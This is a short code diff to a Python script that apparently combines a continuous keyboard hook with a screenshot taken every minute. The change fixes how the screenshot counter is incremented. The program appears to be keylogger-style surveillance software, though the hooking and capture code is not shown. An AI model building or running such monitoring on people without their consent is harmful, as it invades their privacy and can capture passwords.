@@ -4,15 +4,16 @@ import schedule
 import time
 
 
-number = 0
+global_number = 0
 
 
 def wait(number):
     PrintScreen.take_screen(number)
-    number = number + 1
+    global global_number
+    global_number = global_number + 1
 
 
-schedule.every(1).minutes.do(wait, number)
+schedule.every(1).minutes.do(lambda: wait(global_number))
 while True:
     Hook_Keyboard.hook_keyboard()
     schedule.run_pending()
